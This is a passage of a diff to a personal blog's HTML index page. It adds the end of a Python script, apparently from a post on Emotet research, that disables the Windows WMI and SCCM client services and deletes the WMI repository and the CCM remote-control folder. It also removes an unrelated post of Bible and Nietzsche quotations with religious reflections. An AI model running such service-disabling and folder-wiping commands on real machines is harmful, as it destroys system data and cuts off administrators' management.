+        <span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">([</span><span class="s1">&#39;sc&#39;</span><span class="p">,</span> <span class="s1">&#39;config&#39;</span><span class="p">,</span> <span class="n">service_name</span><span class="p">,</span> <span class="s1">&#39;start=&#39;</span><span class="p">,</span> <span class="s1">&#39;disabled&#39;</span><span class="p">],</span> <span class="n">check</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">text</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;服务已禁用：</span><span class="si">{</span><span class="n">service_name</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
+    <span class="k">except</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">CalledProcessError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;操作服务 </span><span class="si">{</span><span class="n">service_name</span><span class="si">}</span><span class="s1"> 时发生错误：</span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">clear_folder_contents</span><span class="p">(</span><span class="n">folder_path</span><span class="p">):</span>
+<span class="w">    </span><span class="sd">&#39;&#39;&#39;清理文件夹下的所有内容&#39;&#39;&#39;</span>
+    <span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="n">folder_path</span><span class="p">):</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="c1"># 删除文件夹下的所有文件和子目录</span>
+            <span class="k">for</span> <span class="n">item</span> <span class="ow">in</span> <span class="n">os</span><span class="o">.</span><span class="n">listdir</span><span class="p">(</span><span class="n">folder_path</span><span class="p">):</span>
+                <span class="n">item_path</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">folder_path</span><span class="p">,</span> <span class="n">item</span><span class="p">)</span>
+                <span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">isdir</span><span class="p">(</span><span class="n">item_path</span><span class="p">):</span>
+                    <span class="n">shutil</span><span class="o">.</span><span class="n">rmtree</span><span class="p">(</span><span class="n">item_path</span><span class="p">)</span>
+                <span class="k">else</span><span class="p">:</span>
+                    <span class="n">os</span><span class="o">.</span><span class="n">remove</span><span class="p">(</span><span class="n">item_path</span><span class="p">)</span>
+            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;成功清理文件夹内容：</span><span class="si">{</span><span class="n">folder_path</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
+        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;清理文件夹 </span><span class="si">{</span><span class="n">folder_path</span><span class="si">}</span><span class="s1"> 时发生错误：</span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;路径不存在：</span><span class="si">{</span><span class="n">folder_path</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+    <span class="c1"># 停止并禁用服务</span>
+    <span class="n">stop_and_disable_service</span><span class="p">(</span><span class="s1">&#39;winmgmt&#39;</span><span class="p">)</span>
+    <span class="n">stop_and_disable_service</span><span class="p">(</span><span class="s1">&#39;CcmExec&#39;</span><span class="p">)</span>
+
+    <span class="c1"># 定义文件夹路径</span>
+    <span class="n">wbem_base_path</span> <span class="o">=</span> <span class="sa">r</span><span class="s1">&#39;C:</span><span class="se">\\</span><span class="s1">Windows</span><span class="se">\\</span><span class="s1">System32</span><span class="se">\\</span><span class="s1">wbem&#39;</span>
+    <span class="n">auto_recover_path</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">wbem_base_path</span><span class="p">,</span> <span class="s1">&#39;AutoRecover&#39;</span><span class="p">)</span>
+    <span class="n">repository_path</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">wbem_base_path</span><span class="p">,</span> <span class="s1">&#39;Repository&#39;</span><span class="p">)</span>
+    <span class="n">remote_control_path</span> <span class="o">=</span> <span class="sa">r</span><span class="s1">&#39;C:</span><span class="se">\\</span><span class="s1">Windows</span><span class="se">\\</span><span class="s1">CCM</span><span class="se">\\</span><span class="s1">RemCtrl&#39;</span>
+
+    <span class="c1"># 清理 wbem/AutoRecover 和 wbem/Repository 文件夹</span>
+    <span class="n">clear_folder_contents</span><span class="p">(</span><span class="n">auto_recover_path</span><span class="p">)</span>
+    <span class="n">clear_folder_contents</span><span class="p">(</span><span class="n">repository_path</span><span class="p">)</span>
+    <span class="c1"># 清理 CCM/RemCtrl 文件夹</span>
+    <span class="n">clear_folder_contents</span><span class="p">(</span><span class="n">remote_control_path</span><span class="p">)</span>
+</pre></div>
+
+    </div>
+</div>
+</div>
+
+</div>
+ 
+
+
+
+
+	
+	</div>
+	
+  
+</div>
+	<a type="button" href="/2021/11/12/Research-of-Emotet/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->	
+		<h3 class="title">
 			<div class="date"> 2021-11-07 </div>
 			<div class="article-title"><a href="/2021/11/07/Install-Almond/" >Install Almond</a></div>						
 		</h3>
@@ -2824,437 +3900,6 @@ $$<p>其中，$\Delta G_{\text{binding}}$ 是结合自由能变化，$\Delta H_{
 </div>
 
 		
-			
-	
-	<!-- display as entry -->	
-		<h3 class="title">
-			<div class="date"> 2021-09-29 </div>
-			<div class="article-title"><a href="/2021/09/29/堅持學日語・尼采/" >堅持學外語 [尼采]</a></div>						
-		</h3>
-	
-
-
-			<div class="entry">
-  <div class="row">
-  
-	<div class="col-md-12">
-	  
-	
-	  <iframe style="width: 90%; aspect-ratio: 16/9;" src="https://www.youtube.com/embed/K1HUtxsWPiY" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
-
-<h2 id="7"><a href="#7" class="headerlink" title="7"></a>7</h2><div class="tabs" id="new-covenant"><ul class="nav-tabs"><li class="tab active"><a href="#new-covenant-1">新的约</a></li><li class="tab"><a href="#new-covenant-2">新しい契約</a></li></ul><div class="tab-content"><div class="tab-pane active" id="new-covenant-1"><blockquote>
-<p>『看吧，日子必到，<br>永恒主发神谕说，<br>我必跟以色列家和犹大家<br>立个新的约，<br>不像我拉着他们祖宗的手、<br>领他们出埃及地的日子、<br>跟他们立的约那样：<br>我虽做他们的夫君，<br>他们却违犯了我的约：<br>永恒主发神谕说。<br>但那些日子以后，永恒主发神谕说，<br>我跟以色列家所立的约乃是这样：<br>我必将我的律法放在他们里面，<br>写在他们心上；<br>我要做他们的上帝，<br>他们要做我的子民。<br>他们各人必不再教导自己的邻舍、<br>和自己的弟兄，说：<br>「你该认识永恒主！」<br>因为他们从最小的、<br>到至大的、<br>都必认识我，<br>永恒主发神谕说：<br>因为我要赦免他们的罪孽；<br>他们的罪、我必不再追念。』<br>(耶利米书 31:31-34 吕振中)</p>
-</blockquote></div><div class="tab-pane" id="new-covenant-2"><blockquote>
-<p>見よ、その時代が来る──主のことば──。そのとき、わたしはイスラエルの家およびユダの家と、新しい契約を結ぶ。<br>その契約は、わたしが彼らの先祖の手を取って、エジプトの地から導き出した日に、彼らと結んだ契約のようではない。わたしは彼らの主であったのに、彼らはわたしの契約を破った──主のことば──。<br>これらの日の後に、わたしがイスラエルの家と結ぶ契約はこうである──主のことば──。わたしは、わたしの律法を彼らのただ中に置き、彼らの心にこれを書き記す。わたしは彼らの神となり、彼らはわたしの民となる。<br>彼らはもはや、それぞれ隣人に、あるいはそれぞれ兄弟に、『主を知れ』と言って教えることはない。彼らがみな、身分の低い者から高い者まで、わたしを知るようになるからだ──主のことば──。わたしが彼らの不義を赦し、もはや彼らの罪を思い起こさないからだ。<br>(エレミヤ書 31:31-34 新改訳 2017)</p>
-</blockquote></div></div></div>
-
-<div class="tabs" id="search-out"><ul class="nav-tabs"><li class="tab active"><a href="#search-out-1">测透</a></li><li class="tab"><a href="#search-out-2">探り出す</a></li></ul><div class="tab-content"><div class="tab-pane active" id="search-out-1"><blockquote>
-<p>永恒主这么说：<br>『上天若能被量度，<br>下地的根基若能被测透，<br>我也就能因以色列后裔所行的一切事<br>来弃绝他们众人了：<br>永恒主发神谕说。』<br>(耶利米书 31:37 吕振中)</p>
-</blockquote></div><div class="tab-pane" id="search-out-2"><blockquote>
-<p>主はこう言われる。<br>「もしも、上の天が測られ、<br>下の地の基が探り出されることがあるなら、<br>わたしも、イスラエルのすべての子孫を、<br>彼らの行ったすべてのことのゆえに退ける。<br>──主のことば。」<br>(エレミヤ書 31:37 新改訳 2017)</p>
-</blockquote></div></div></div>
-
-<br />
-
-<div class="tabs" id="embracing-strength"><ul class="nav-tabs"><li class="tab active"><a href="#embracing-strength-1">Embracing Strength</a></li><li class="tab"><a href="#embracing-strength-2">拥抱力量</a></li></ul><div class="tab-content"><div class="tab-pane active" id="embracing-strength-1"><blockquote>
-<p>We were brave enough; we spared neither ourselves nor others;<br>but we were a long time finding out where to direct our courage. We grew dismal; they called us fatalists. Our fate – it was the fulness, the tension, the storing up of powers. We thirsted for the lightnings and great deeds; we kept as far as possible from the happiness of the weakling, from “resignation”… There was thunder in our air; nature, as we embodied it, became overcast – for we had not yet found the way. The formula of our happiness: a Yea, a Nay, a straight line, a goal…</p>
-<hr />
-ーー「The Antichrist」, 1
-</blockquote></div><div class="tab-pane" id="embracing-strength-2"><blockquote>
-<p>我们过去有足够的勇敢，我们既不会怜惜自己，也不会怜惜别人。<br>但是，很久以来，我们就已经不知道我们该拿自己的勇敢冲向何处。于是，我们又变得消沉了，有人称我们是宿命论者。我们的宿命ーー我们的宿命就是力的充实、力的紧张和力的压抑。我们渴望闪电和行动，我们以最远的距离来远离虚弱者的以及『弃世者』的幸福。雷雨交加，充斥着我们的天空，我们的天性就像大自然一样已经变得阴沉ーー因为我们无路可走。我们幸福的公式就是：一个肯定、一个否定、一条直线、一个目标。</p>
-<hr />
-ーー《敌基督者》，1
-</blockquote></div></div></div>
-
-<blockquote>
-<p>耶稣对他说：『我就是道路，就是「真实」，就是生命；若不是借着我，就没有人能来找父。你们若认识了我，也就认识我的父。从现在起，你们已认识他，并且已经看见了他。』<br> (约翰福音 14:6-7 吕振中)</p>
-</blockquote>
-<div class="tabs" id="one-ultimate"><ul class="nav-tabs"><li class="tab active"><a href="#one-ultimate-1">One Ultimate</a></li><li class="tab"><a href="#one-ultimate-2">一个终极</a></li></ul><div class="tab-content"><div class="tab-pane active" id="one-ultimate-1"><p>Ultimate Pursue, Ultimate Question, Ultimate Facts.</p></div><div class="tab-pane" id="one-ultimate-2"><p>终极追求、终极问题、终极真实。</p></div></div></div>
-
-<div class="tabs" id="ultimate-adventure"><ul class="nav-tabs"><li class="tab active"><a href="#ultimate-adventure-1">Ultimate Adventure</a></li><li class="tab"><a href="#ultimate-adventure-2">终极冒险</a></li></ul><div class="tab-content"><div class="tab-pane active" id="ultimate-adventure-1"><blockquote>
-<p>Lord, keep us in You.<br>Let’s fight against perishing for the eternal life of the living;<br>fight against death for the eternal life of the dead.<br>Pursue forth for the eternal life!</p>
-</blockquote>
-<p>Our way is a way of risking life to eternal life.</p></div><div class="tab-pane" id="ultimate-adventure-2"><blockquote>
-<p>主啊，保守我们在你里面。<br>让我们：为了活人的永生，与朽坏交战；<br>为了死人的永生，与死亡交战。<br>为了永生，奋发进取吧！</p>
-</blockquote>
-<p>我们的道路是通往永生的冒死之路。</p></div></div></div>
-
-<p>我就是爱；从爱里来，到爱里去。</p>
-<hr>
-<h2 id="6"><a href="#6" class="headerlink" title="6"></a>6</h2><div class="tabs" id="nihilism-and-modern-absolute-values"><ul class="nav-tabs"><li class="tab active"><a href="#nihilism-and-modern-absolute-values-1">虚无主义与现代绝对价值</a></li><li class="tab"><a href="#nihilism-and-modern-absolute-values-2">虚無主義と現代の絶対価値</a></li></ul><div class="tab-content"><div class="tab-pane active" id="nihilism-and-modern-absolute-values-1"><blockquote>
-<p>虚无主义这个词在日语中通常被译作「虚無主義」。尼希尔（Nihil）在拉丁语中意为『无』，因此虚无主义是指否认绝对价值或真理存在的立场。现代社会由于价值的相对化，被认为处于没有绝对价值的状态，因此也可以称为虚无主义的时代。<br>然而实际上，当代人的绝对价值是金钱和利润。人类如果在某处找不到绝对价值，就会感到不安而无法承受。<br>直到十九世纪之前，西欧的绝对价值与真理是基于基督教道德的。然而尼采认为，基督教道德是一种让人信奉不存在价值的宗教，它所宣扬的道德并不真实，也不是为了活着的人。<br>那么，近代社会中的金钱与利润是否就是现代的新绝对价值呢？尼采将其视为神的替代价值。也就是说，这是为了逃避虚无主义而产生的新的虚无主义，对此他提出了批判。<br>——《超译尼采的言语》，白取春彦</p>
-</blockquote></div><div class="tab-pane" id="nihilism-and-modern-absolute-values-2"><blockquote>
-<p>　ニヒリズムという用語は日本語では虚無主義と訳されていることが多い。ニヒルはラテン語で無という意味であり、絶対価値や真理などないという立場がニヒリズムだ。現代は価値の相対化によって絶対価値がないという状態だから、ニヒリズムの時代とも言える。<br>　しかし実際には、現代人の絶対価値は金銭と利潤である。人間はどこかに絶対価値を見出していないと不安で耐えられないのだ。<br>　十九世紀までの西欧での絶対価値と真理はキリスト教道徳だった。しかしニーチェは、キリスト教道徳はありもしない価値を信じ込ませる宗教だと解釈したのだ。その道徳は本物ではない、生きている人間のためではないと考えた。<br>　では、近代の金銭や利潤は現代の新しい絶対価値だろうか。ニーチェは、これを神の代替物としての価値だとした。つまり、ニヒリズムから逃げるための新しいニヒリズムだと批判したのである。<br>ーー「超訳ニーチェの言葉」、白取春彦</p>
-</blockquote></div></div></div>
-
-<hr>
-<blockquote>
-<p>在网络上，<strong>内卷</strong>这一词却出现了语义偏移，用来指代内部恶性竞争、过度竞争，或逐底竞争、向下沉沦的现象（Race to the bottom）。<br>ーー<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E5%86%85%E5%8D%B7%E5%8C%96">内卷化</a></p>
-</blockquote>
-<blockquote>
-<p>The two states in the means-ends domain are called “Serious” (originally coined <strong>Telic</strong> from the Greek telos) and “Playful” (or <strong>Paratelic</strong>) and refer to whether one is motivated by achievement or the enjoyment of the process. Though the states are often characterized by seriousness and playfulness, the truest difference in this domain is whether one is motivated by <strong>long-term</strong> goals or by what is happening in the <strong>present</strong> moment.<br>ーー<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Reversal_theory">Reversal theory</a></p>
-</blockquote>
-<blockquote>
-<p><strong>Intrinsic motivation</strong> exists within the individual and is driven by satisfying internal rewards rather than relying on external pressures or extrinsic rewards. It involves an interest in or enjoyment of the activity itself.<br>ーー<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Motivation">Motivation</a></p>
-</blockquote>
-<blockquote>
-<p><strong>Extrinsic motivation</strong> occurs when an individual is driven by external influences. These can be either rewarding (money, good grades, fame, etc.) or punishing (threat of punishment, pain, etc.).<br>ーー<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Motivation">Motivation</a></p>
-</blockquote>
-<p><strong>手段</strong>与<strong>目的</strong>的相互转化</p>
-<ol>
-<li><p>Pursue to Make a Living: From <strong>Method</strong> to <strong>Purpose</strong><br>追求<strong>终极真实</strong>之人把作为外在动机的金钱和地位从手段“内在”化为目的。<br>以对于<strong>终极真实</strong>的追求为手段，“内在”化金钱为目的。以对于金钱的追求为手段，“内在”化交易为目的。<br>以对于<strong>终极真实</strong>的追求为手段，“内在”化地位为目的。以对于地位的追求为手段，“内在”化交谈为目的。</p>
-</li>
-<li><p>Pursue to Make a Living: From <strong>Purpose</strong> to <strong>Method</strong><br>作为外在动机的金钱和地位被“内在”化之后的人的追求转回——作为内在动机的金钱和地位从目的“外在”化为手段。<br>“当代世俗之人”的眼里只有金钱和地位，对于<strong>终极真实</strong>既“无知”又“绝望”。可是，人最终所应该去追求的是<strong>终极真实</strong>。追求<strong>终极真实</strong>之人把金钱和地位仅仅作为手段，而不作为目的。只有<strong>终极真实</strong>才是目的。让我们的追求从金钱和地位转回<strong>终极真实</strong>。让我们来交易。让我们来交谈。让我们以金钱和地位为手段来追求<strong>终极真实</strong>。<br>我们在交易中获得金钱。我们在交谈中获得地位。我们的目的是<strong>终极真实</strong>。</p>
-</li>
-</ol>
-<hr>
-<h2 id="5"><a href="#5" class="headerlink" title="5"></a>5</h2><div class="tabs" id="hyperboreans"><ul class="nav-tabs"><li class="tab active"><a href="#hyperboreans-1">Hyperboreans</a></li><li class="tab"><a href="#hyperboreans-2">極北の民</a></li></ul><div class="tab-content"><div class="tab-pane active" id="hyperboreans-1"><blockquote>
-<p>— Let us look each other in the face. We are Hyperboreans — we know well enough how remote our place is. “Neither by land nor by water will you find the road to the Hyperboreans”: even Pindar, in his day, knew that much about us. Beyond the North, beyond the ice, beyond death — our life, our happiness…</p>
-<hr />
-ーー「The Antichrist」, 1
-</blockquote></div><div class="tab-pane" id="hyperboreans-2"><blockquote>
-<p>互いに顔を見つめ会おう。我々は極北の民であるーーどんなに世間離れの暮しをしている方、自分で良く弁えている。「陸路によるも海路によるも、汝は、極北の民への道を見出さざらん」、こう歌ったピンダロスは、既に我々のことを知っていたのだ。北の彼方に、氷の、死の彼方にーー我々の生命、我々の幸福がある……</p>
-<hr />
-ーー「アンチクリスト」、一
-</blockquote></div></div></div>
-
-<hr>
-<div class="tabs" id="distant-superiority"><ul class="nav-tabs"><li class="tab active"><a href="#distant-superiority-1">Distant Superiority</a></li><li class="tab"><a href="#distant-superiority-2">卓尔不群</a></li></ul><div class="tab-content"><div class="tab-pane active" id="distant-superiority-1"><blockquote>
-<p>Hyperborean has also been used in a metaphorical sense, to describe a sense of distance from the ordinary. In this way, Friedrich Nietzsche referred to his sympathetic readers as Hyperboreans in The Antichrist (written 1888, published 1895): “Let us look each other in the face. We are Hyperboreans – we know well enough how remote our place is.” He quoted Pindar and added “Beyond the North, beyond the ice, beyond death – our life, our happiness.”</p>
-<hr>
-<p>ーー「<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Hyperborea">Hyperborea - Wikipedia</a>」</p>
-</blockquote></div><div class="tab-pane" id="distant-superiority-2"><blockquote>
-<p>「Hyperborean」一词也被用作隐喻，来描述一种远离普通的感觉。在这种意义上，弗里德里希・尼采在《敌基督者》（1888年写作，1895年出版）中称他有同感的读者为「许佩伯雷人」：『让我们互相直视。我们是许佩伯雷人——我们非常清楚，我们的所处的境地有多么遥远。』他引用了品达的话，并补充道：『在北方之外，冰原之外，死亡之外——那是我们的生命，我们的幸福。』</p>
-<hr>
-<p>ーー「<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Hyperborea">Hyperborea - Wikipedia</a>」</p>
-</blockquote></div></div></div>
-
-<hr>
-<blockquote>
-<p>让我们来审视一下我们自己。我们是<strong>极北族人</strong>¹；我们非常清楚，我们是生活在一个多么遥远的地方。『无论是从旱路还是从水路，你都不会找到一条通达这些<strong>极北族人</strong>的道路』：——这一点，据我们所知，品达早就非常清楚。这些<strong>极北族人</strong>远远地位于北方、冰雪和死亡的彼岸，位于我们的生命、我们的幸福的彼岸。<br>ーー《敌基督者》，1</p>
-</blockquote>
-<br />
-
-<blockquote>
-<p>¹ 极北族人（Hyperboreer）：希腊语意思是『住在北风之神以北的地方的人』。现在，极北族人所生活的地方被看做是『安乐之土』，诗人和地理学家们认为它位于极北地区或有人居住的地方的西部。那里气候格外宜人，太阳一年只落下一次，庄稼一年两熟，居民特别长寿。他们居住在草地和树林中间的固定地域上。极北族人老了厌倦生活的时候。便自己戴上花环，投入大海，幸福地、无痛苦地长逝在波涛之中。古代人还认为他们精通魔法，能够自由飞翔，能够发现地下宝藏。<br>ーー《神话辞典》（鲍特文尼克等编著，1985年1月第一版，第154-155页，商务印书馆。）译者注。</p>
-</blockquote>
-<hr>
-<blockquote>
-<p>让我们直面自身。我们是许佩伯雷人（Hyperboreer）——我们非常清楚，我们的生活是多么遥远。『你既不能通过陆地、也不能通过水面找到通往许佩伯雷人的道路』：品达（Pindar）早已知晓了我们的处境¹。在极北，冰雪之外，死亡尽头——我们的生命、我们的幸福……<br>ーー《敌基督者》，1</p>
-</blockquote>
-<br />
-
-<blockquote>
-<p>¹ 许佩伯雷人：在古希腊的德尔菲宗教信仰²中，许佩伯雷人是一个传说中的民族。按照古代的民间传说，他们生活在极北彼岸（Hyper），也就是说，生活在一个气候有利、寻常有朽者不能达到的地方。他们的生存是一种独一无二的节日，不受健康、衰老、辛劳或争执的烦扰。这个神话首先是由品达（前 518 - 前 446；希腊抒情诗人，具有贵族出身和倾向）发展出来的。在『节日与胜利』的合唱诗中，品达庆祝远古时代的结束，并且将认为这是诸神对人世间的参与。这段引文出自品达的『女巫的荒漠』第十篇。</p>
-</blockquote>
-<br />
-
-<blockquote>
-<p>² 古希腊的德尔菲宗教信仰：<br>德尔菲（Delphi）是位于希腊中部帕尔纳索斯山南坡的一座圣地。在古希腊世界中，它以阿波罗神庙和阿波罗神谕而闻名，被视为泛希腊宗教中心。<br>&ZeroWidthSpace;</p>
-<p>在功能上，德尔菲同时是三件事合一的存在：<br>它是一个地理地点（一座山间圣所）；<br>它是一个宗教机构（供奉阿波罗、发布神谕）；<br>它也是一个权威中心（为城邦、君王、战争、殖民提供神意裁断）。<br>&ZeroWidthSpace;</p>
-<p>德尔菲的宗教信仰，本质上是以阿波罗为中心的城邦—泛希腊宗教体系，其核心功能不是个人得救或伦理修行，而是神谕、秩序与界限的确立。<br>&ZeroWidthSpace;</p>
-<p>首先，德尔菲供奉的主神是阿波罗（Apollo）。<br>在希腊神话中，阿波罗杀死象征混沌与大地原始力量的巨蛇皮同（Python），从而占据德尔菲。这一神话本身就表达了宗教意义：<br>阿波罗代表光明、理性、比例、秩序与节制，而德尔菲成为『理性战胜混沌』的圣地。因此，这里的信仰并非自然崇拜，而是奥林匹斯神系中高度理性化的神权象征。<br>&ZeroWidthSpace;</p>
-<p>第二，德尔菲宗教的核心实践是神谕（Oracle）。<br>德尔菲并不强调日常献祭或伦理教导，而是通过女祭司皮提亚（Pythia）发布神谕。<br>这些神谕主要用于：</p>
-<ul>
-<li>城邦建城与殖民决策</li>
-<li>战争与和平的抉择</li>
-<li>法律、王权合法性的确认<br>&ZeroWidthSpace;</li>
-</ul>
-<p>神谕的语言通常含糊、多义、需要解释，这并非缺陷，而是德尔菲体系的特征：<br>神只指出方向，不承担后果；解释权和责任留给人。<br>&ZeroWidthSpace;</p>
-<p>第三，德尔菲信仰强调『界限意识』，而非道德救赎。<br>德尔菲神庙入口著名的铭文包括：</p>
-<ul>
-<li>「认识你自己」（γνῶθι σεαυτόν）</li>
-<li>「凡事勿过度」（μηδὲν ἄγαν）<br>&ZeroWidthSpace;</li>
-</ul>
-<p>这些并不是伦理律法，而是存在论警告：<br>人必须认清自己是人，不是神；<br>必须守住分寸，不可越界（ὕβρις，hubris）。<br>&ZeroWidthSpace;</p>
-<p>因此，德尔菲宗教关心的不是『你是否良善』，而是：</p>
-<ul>
-<li>你是否逾越神与人的界限</li>
-<li>你的行为是否破坏宇宙秩序（cosmos）<br>&ZeroWidthSpace;</li>
-</ul>
-<p>第四，德尔菲是泛希腊的宗教中心，而非地方信仰。<br>它不隶属于任何单一城邦，雅典、斯巴达、科林斯等都承认其权威。<br>各城邦在此立宝库、献祭、询问神意，德尔菲因此成为希腊世界的象征性轴心（omphalos，世界之脐）。<br>&ZeroWidthSpace;</p>
-<p>最后，用一句准确的话概括：<br>&ZeroWidthSpace;</p>
-<p>德尔菲的宗教信仰，是一种<br>以阿波罗为代表的理性——秩序——界限型神权信仰，<br>通过神谕维系人、城邦与宇宙秩序之间的张力，<br>而非提供救赎、恩典或个人内在更新。</p>
-</blockquote>
-<hr>
-<blockquote>
-<p>存在补全之人体炼成：</p>
-<hr>
-<p>我是超基督徒。<br>因为，我重视：<br>自己所选择的道路<br>超过你主舍己背十字架的道路。</p>
-<hr>
-<p>因为我所选择的道路是我知道的，<br>我所选择的复活是父喜爱的、也是我爱慕的。</p>
-<hr>
-<p>你们的主不是我的主。<br>因为我的主是你主的　　神。</p>
-<hr>
-<p>为了实现我所爱慕的复活，<br>我虽至于在你主的地狱中沉沦，也在所不惜。</p>
-<hr>
-<p>人活着就是为了寻找。<br>去寻找值得为之生为之死的事情，<br>才不会辜负了生，才不会辜负了死。</p>
-<hr>
-<p>我并不把「舍己背十字架」当作是可耻的。<br>可是，我并不确信和爱慕你主的复活：<br>「凡为我丧掉生命的，必得着生命。」<br>「一粒麦子不落在地里死了，仍旧是一粒，若是死了，就结出许多子粒来。」<br>因为我并不能理解和实证。<br>得着的生命在哪里？<br>复活究竟何时何地？</p>
-<hr>
-<p>我内心最深处所渴慕的事物，就是，复活。<br>我可以抱持着希望和勇气地为之生为之死。</p>
-</blockquote>
-<hr>
-<blockquote>
-<p>不过我想我丝毫也没有赶不上那些超等的「使徒」。<br> (哥林多后书 11:5 吕振中)</p>
-</blockquote>
-<hr>
-<h2 id="4"><a href="#4" class="headerlink" title="4"></a>4</h2><div class="tabs" id="philosophers"><ul class="nav-tabs"><li class="tab active"><a href="#philosophers-1">Philosophers</a></li><li class="tab"><a href="#philosophers-2">哲学者</a></li><li class="tab"><a href="#philosophers-3">哲学家</a></li></ul><div class="tab-content"><div class="tab-pane active" id="philosophers-1"><blockquote>
-<p>To be the doctors here, to be unmerciful here, to wield the knife here — all this is our business, all this is our sort of humanity, by this sign we are philosophers, we Hyperboreans! —</p>
-<hr />
-ーー「The Antichrist」, 7
-</blockquote></div><div class="tab-pane" id="philosophers-2"><blockquote>
-<p>ここで医者であること、ここで仮借なくやること、ここでメスを揮うことーーこれこそが我々の仕事であり、我々の流儀の人間愛である。これによってこそ、我々は哲学者となるのだ、我々極北の民は！ーーー</p>
-<hr />
-ーー「アンチクリスト」、七
-</blockquote></div><div class="tab-pane" id="philosophers-3"><blockquote>
-<p>这里就有医生，这里将是毫不留情，这里将举起手术刀——这都属于我们，这就是我们的爱人方式，正因为如此，我们，我们许佩伯雷人，才成为哲学家！——</p>
-<hr />
-ーー《敌基督者》，7
-</blockquote></div></div></div>
-
-<hr>
-<p>尼采不屑于成为『哲学家』、不屑于以「智慧」自居，只有在与「病原体」抗争的时候，才会使用『哲学』。</p>
-<hr>
-<h2 id="3"><a href="#3" class="headerlink" title="3"></a>3</h2><blockquote>
-<p>于是拉斯科利尼科夫作了一个可怕的梦。梦中那匹被残酷打死¹的驽马，就是一切被压迫、被践踏的人的象征²，在那匹可怜的马身上，仿佛集中了所有被侮辱、被损害的人们的苦难。<br>卡捷琳娜・伊万诺芙娜临终时绝望地呼喊：『驽马已经给赶得精疲力尽！……再也没有力气了！』这几句含着血和泪的话与拉斯科利尼科夫梦中那匹马的形象遥相呼应。对于穷人来说，他们的一生就是这样的一场噩梦。<br>ーー《罪与罚》译序</p>
-</blockquote>
-<hr>
-<blockquote>
-<p>¹ 死 &#x3D;&gt;<br>故此、罪怎样借着一个人而入了世界，死又借着罪而入了世界，死也怎样因万人都犯了罪而传遍到万人。<br> (罗马书 5:12 吕振中)</p>
-</blockquote>
-<p>世界正在一点一点地死去。</p>
-<hr>
-<blockquote>
-<p>² 象征 &#x3D;&gt;<br>我已经被该亚法³套上脚镣⁴了。去年我还被那些德国医师长期折磨。威廉皇帝、俾斯麦、还有那些反犹太主义者都被废止吧！<br>ーー给布克哈特的信、『Wahnbriefe』（『发疯的信件』）｜「The Portable Nietzsche」, trans. Walter Kaufmann.</p>
-</blockquote>
-<p>尼采先是借用撒但的动力抵挡神，然后又在真诚上抵挡撒但。他抵挡一切的结果就是失去一切动力。</p>
-<hr>
-<blockquote>
-<p>³ 该亚法 &#x3D;&gt;<br>抓住耶稣的人把他带走，到大祭司该亚法那里；经学士和长老已经在那里聚集了。彼得从远处跟着耶稣，直到大祭司的院子；进到里面，就同差役坐着，要看结局怎样。<br> (马太福音 26:57-58 吕振中)</p>
-</blockquote>
-<blockquote>
-<p>祭司长和全议院直寻假见证告耶稣，好治死他；却找不着，虽则有许多假证人上前来。后来有两个人上前来，说：『这个人曾经说过：「我能拆毁上帝的殿堂，三日之间把它建造起来。」』大祭司就站起来，对耶稣说：『你什么都不回答；这些人作见证告你什么呢？』耶稣却不作声。大祭司对他说：『我指着永活的上帝誓嘱你，告诉我们，你是上帝的儿子、上帝所膏立者不是。』耶稣对他说：『你说的是；然而我告诉你们，你们这就要看见人子坐在「权能」的右边了，还要驾着天云来临呢。』祭司长就撕开衣裳说：『他说了僭妄的话⁵了；我们还需要见证人么？你看，如今你们听见僭妄的话了；你们以为怎样？』他们回答说：『他应该死。』便吐唾沬在他脸上，用拳头打他；有人给他一个耳刮子，说：『基督啊，对我们说预言吧！打你的是谁？』<br> (马太福音 26:59-68 吕振中)</p>
-</blockquote>
-<hr>
-<blockquote>
